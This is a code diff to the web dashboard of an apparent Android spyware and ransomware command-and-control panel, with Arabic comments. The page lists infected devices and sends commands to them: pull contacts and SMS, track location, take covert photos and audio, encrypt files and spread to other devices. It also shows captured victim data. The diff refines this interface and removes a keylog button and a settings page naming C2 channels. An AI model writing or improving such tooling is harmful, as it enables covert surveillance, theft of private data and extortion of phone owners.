@@ -39,18 +39,22 @@
             background: #1a1a1a;
             padding: 20px;
             border-right: 2px solid #00ff00;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
         }
         
         .sidebar button {
             width: 100%;
             padding: 12px;
-            margin: 5px 0;
             background: transparent;
             border: 1px solid #00ff00;
             color: #00ff00;
             cursor: pointer;
             border-radius: 5px;
             font-family: 'Courier New', monospace;
+            font-size: 14px;
+            transition: all 0.3s;
         }
         
         .sidebar button:hover {
@@ -67,31 +71,41 @@
         .device-card {
             background: #1a1a1a;
             border: 1px solid #00ff00;
-            border-radius: 5px;
+            border-radius: 8px;
             padding: 15px;
             margin: 10px 0;
             cursor: pointer;
+            transition: all 0.3s;
         }
         
         .device-card:hover {
             background: #2a2a2a;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
         }
         
-        .device-online {
-            color: #00ff00;
+        .device-card h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
         }
         
-        .device-offline {
-            color: #ff0000;
+        .device-card p {
+            font-size: 12px;
+            color: #00cc00;
+            margin: 3px 0;
         }
         
         .command-panel {
             background: #1a1a1a;
             border: 1px solid #00ff00;
-            border-radius: 5px;
+            border-radius: 8px;
             padding: 20px;
             margin-top: 20px;
+        }
+        
+        .command-panel h2 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            text-align: center;
         }
         
         .command-buttons {
@@ -102,27 +116,61 @@
         }
         
         .command-btn {
-            padding: 10px;
+            padding: 12px;
             background: transparent;
             border: 1px solid #00ff00;
             color: #00ff00;
             cursor: pointer;
             border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            transition: all 0.3s;
+            text-align: center;
         }
         
         .command-btn:hover {
             background: #00ff00;
             color: #000;
+            box-shadow: 0 0 10px #00ff00;
         }
         
         .log-output {
             background: #000;
             border: 1px solid #00ff00;
-            padding: 10px;
+            padding: 15px;
             height: 300px;
             overflow-y: auto;
             margin-top: 20px;
             font-size: 12px;
+            border-radius: 5px;
+        }
+        
+        .log-output p {
+            margin: 5px 0;
+            line-height: 1.5;
+        }
+        
+        .no-devices {
+            text-align: center;
+            padding: 40px;
+            font-size: 18px;
+            color: #ffff00;
+        }
+        
+        .back-btn {
+            margin-top: 10px;
+            padding: 10px;
+            background: transparent;
+            border: 1px solid #ffff00;
+            color: #ffff00;
+            cursor: pointer;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .back-btn:hover {
+            background: #ffff00;
+            color: #000;
         }
     </style>
 </head>
@@ -135,29 +183,31 @@
         <div class="sidebar">
             <button onclick="showDevices()">📱 Devices</button>
             <button onclick="showLogs()">📊 Logs</button>
-            <button onclick="showSettings()">⚙️ Settings</button>
             <button onclick="logout()">🚪 Logout</button>
         </div>
         
         <div class="main-content" id="mainContent">
-            <!-- المحتوى الديناميكي -->
+            <p>> Loading...</p>
         </div>
     </div>
     
     <script>
-        // ===== التحقق من تسجيل الدخول =====
+        let autoRefreshInterval = null;
+        
+        // ===== عند تحميل الصفحة =====
         window.onload = function() {
             checkAuth();
         };
         
         function checkAuth() {
             fetch('/api/check-auth')
-                .then(response => response.json())
+                .then(r => r.json())
                 .then(data => {
                     if (!data.logged_in) {
                         window.location.href = '/';
                     } else {
                         showDevices();
+                        startAutoRefresh();
                     }
                 })
                 .catch(() => {
@@ -165,68 +215,92 @@
                 });
         }
         
+        function startAutoRefresh() {
+            stopAutoRefresh();
+            autoRefreshInterval = setInterval(() => {
+                const content = document.getElementById('mainContent');
+                if (content && content.innerHTML.includes('Connected Devices')) {
+                    showDevices();
+                }
+            }, 5000);
+        }
+        
+        function stopAutoRefresh() {
+            if (autoRefreshInterval) {
+                clearInterval(autoRefreshInterval);
+                autoRefreshInterval = null;
+            }
+        }
+        
+        // ===== عرض الأجهزة =====
         function showDevices() {
             fetch('/api/devices')
-                .then(response => response.json())
+                .then(r => r.json())
                 .then(data => {
                     let html = '<h2>📱 Connected Devices</h2>';
                     
                     if (data.devices && data.devices.length > 0) {
                         data.devices.forEach(device => {
+                            const lastSeen = new Date(device.last_seen).toLocaleString();
                             html += `
-                                <div class="device-card" onclick="selectDevice('${device.id}')">
-                                    <h3 class="${device.online ? 'device-online' : 'device-offline'}">
-                                        ${device.online ? '🟢' : '🔴'} ${device.model || 'Unknown'}
-                                    </h3>
+                                <div class="device-card" onclick="showCommands('${device.id}')">
+                                    <h3>🟢 ${device.model || 'Unknown Device'}</h3>
                                     <p>ID: ${device.id}</p>
-                                    <p>IP: ${device.ip_address || 'N/A'}</p>
                                     <p>Android: ${device.android_version || 'N/A'}</p>
+                                    <p>Last Seen: ${lastSeen}</p>
                                 </div>
                             `;
                         });
                     } else {
-                        html += '<p>No devices connected</p>';
+                        html += '<div class="no-devices">⚠️ No devices connected<br><br>Waiting for device...</div>';
                     }
                     
                     document.getElementById('mainContent').innerHTML = html;
                 })
                 .catch(error => {
                     document.getElementById('mainContent').innerHTML = 
-                        '<p class="device-offline">Failed to load devices</p>';
+                        '<div class="no-devices">❌ Failed to load devices</div>';
                 });
         }
         
-        function selectDevice(deviceId) {
-            showCommandPanel(deviceId);
-        }
-        
-        function showCommandPanel(deviceId) {
+        // ===== عرض الأوامر =====
+        function showCommands(deviceId) {
+            stopAutoRefresh();
+            
             let html = `
                 <div class="command-panel">
-                    <h2>🎮 Command Panel - Device: ${deviceId}</h2>
+                    <h2>🎮 Command Panel</h2>
+                    <p style="text-align:center; margin-bottom:10px;">Device: ${deviceId}</p>
                     
                     <div class="command-buttons">
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'keylog')">📝 Get Keylog</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'contacts')">📞 Get Contacts</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'sms')">💬 Get SMS</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'location')">📍 Get Location</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'camera')">📷 Take Photo</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Record Audio</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'encrypt')">🔒 Encrypt Files</button>
+                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'contacts')">📞 Contacts</button>
+                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'sms')">💬 SMS</button>
+                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'location')">📍 Location</button>
+                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'camera')">📷 Camera</button>
+                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Audio</button>
+                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'encrypt')">🔒 Encrypt</button>
                         <button class="command-btn" onclick="sendCommand('${deviceId}', 'spread')">📡 Spread</button>
-                        <button class="command-btn" onclick="sendCommand('${deviceId}', 'selfdestruct')">💣 Self Destruct</button>
                     </div>
                 </div>
                 
                 <div class="log-output" id="logOutput">
                     <p>> Waiting for command execution...</p>
                 </div>
+                
+                <button class="back-btn" onclick="backToDevices()">⬅ Back to Devices</button>
             `;
             
             document.getElementById('mainContent').innerHTML = html;
         }
         
+        // ===== إرسال أمر =====
         function sendCommand(deviceId, command) {
+            const logOutput = document.getElementById('logOutput');
+            
+            if (logOutput) {
+                logOutput.innerHTML += `<p>> Sending: ${command}...</p>`;
+            }
+            
             fetch('/api/commands', {
                 method: 'POST',
                 headers: {
@@ -237,52 +311,64 @@
                     command: command
                 })
             })
-            .then(response => response.json())
+            .then(r => r.json())
             .then(data => {
-                document.getElementById('logOutput').innerHTML += 
-                    `<p>> Command sent: ${command}</p>`;
+                if (data.success) {
+                    if (logOutput) {
+                        logOutput.innerHTML += `<p style="color:#00ff00;">> Command sent: ${command}</p>`;
+                    }
+                } else {
+                    if (logOutput) {
+                        logOutput.innerHTML += `<p style="color:#ff0000;">> Failed to send</p>`;
+                    }
+                }
             })
             .catch(error => {
-                document.getElementById('logOutput').innerHTML += 
-                    `<p class="device-offline">> Failed to send command</p>`;
+                if (logOutput) {
+                    logOutput.innerHTML += `<p style="color:#ff0000;">> Error: ${error.message}</p>`;
+                }
             });
         }
         
+        // ===== الرجوع للأجهزة =====
+        function backToDevices() {
+            showDevices();
+            startAutoRefresh();
+        }
+        
+        // ===== عرض السجلات =====
         function showLogs() {
+            stopAutoRefresh();
+            
             fetch('/api/data')
-                .then(response => response.json())
+                .then(r => r.json())
                 .then(data => {
                     let html = '<h2>📊 Captured Data</h2>';
                     
                     if (data.logs && data.logs.length > 0) {
+                        html += '<div class="log-output" style="height: 500px;">';
                         data.logs.forEach(log => {
-                            html += `<div class="device-card"><p>${log}</p></div>`;
+                            html += `<p>${log}</p>`;
                         });
+                        html += '</div>';
                     } else {
-                        html += '<p>No captured data</p>';
+                        html += '<div class="no-devices">No data captured yet</div>';
                     }
+                    
+                    html += '<br><button class="back-btn" onclick="backToDevices()">⬅ Back to Devices</button>';
                     
                     document.getElementById('mainContent').innerHTML = html;
                 })
                 .catch(error => {
                     document.getElementById('mainContent').innerHTML = 
-                        '<p class="device-offline">Failed to load logs</p>';
+                        '<div class="no-devices">❌ Failed to load data</div>';
                 });
         }
         
-        function showSettings() {
-            document.getElementById('mainContent').innerHTML = `
-                <h2>⚙️ Settings</h2>
-                <div class="command-panel">
-                    <h3>C2 Server Configuration</h3>
-                    <p>Server URL: https://your-c2-server.com</p>
-                    <p>Telegram Bot: @AnubisXBot</p>
-                    <p>TOR: anubisx.onion</p>
-                </div>
-            `;
-        }
-        
+        // ===== تسجيل الخروج =====
         function logout() {
+            stopAutoRefresh();
+            
             fetch('/api/logout', { method: 'POST' })
                 .then(() => {
                     window.location.href = '/';
